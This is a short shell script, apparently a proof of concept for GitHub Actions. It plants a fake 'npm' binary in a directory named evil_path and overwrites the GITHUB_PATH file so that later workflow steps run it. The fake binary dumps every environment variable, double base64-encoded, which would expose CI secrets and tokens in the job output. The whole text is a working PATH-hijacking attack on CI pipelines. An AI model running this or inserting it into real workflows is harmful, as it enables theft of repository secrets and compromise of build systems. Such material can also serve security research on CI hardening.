mkdir evil_path
echo 'env | base64 | base64' > evil_path/npm

chmod +x evil_path/npm
echo "Github Path: $GITHUB_PATH"
echo "Printing contents:"
cat $GITHUB_PATH
echo "./evil_path" > $GITHUB_PATH
